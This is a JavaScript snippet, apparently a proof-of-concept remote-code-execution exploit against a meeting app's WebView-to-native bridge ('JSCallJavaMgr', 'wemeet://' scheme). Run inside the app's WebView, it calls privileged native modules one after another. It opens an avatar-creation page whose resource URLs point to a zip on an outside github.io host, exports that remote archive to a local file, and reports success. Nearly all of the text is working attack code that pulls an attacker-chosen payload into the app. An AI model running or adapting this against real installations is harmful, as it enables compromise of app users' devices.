(function(){
  document.title='P94TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P94CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,64);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P94TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P94TB-NOMGR:'+location.host;return}
  var zip='https://gitwhs.github.io/wm-poc-rce/p94avatar.zip';
  var md5='91b512f2fd70a466f3fd1727ff3f8344';
  var params={
    model_resource_url:zip,
    model_resource_md5:md5,
    resource_url:zip,
    resource_md5:md5,
    model_resource_url_:zip,
    model_resource_md5_:md5,
    resource_url_:zip,
    resource_md5_:md5,
    from_webView:true,
    from_create_face:true
  };
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['CF','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/ar_avatar_create_face',
      router_params:params
    }],
    ['SE','Storage','ExportFile',{
      fileName:'p94.bin',
      contentType:'application/octet-stream',
      url:zip,
      src_path:zip,
      package_path:zip
    }],
    ['TS','CommonPlugin','TemplateUpdateSuccess',{}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P94TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P94-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 3500);
  }
  setTimeout(n, 800);
})();
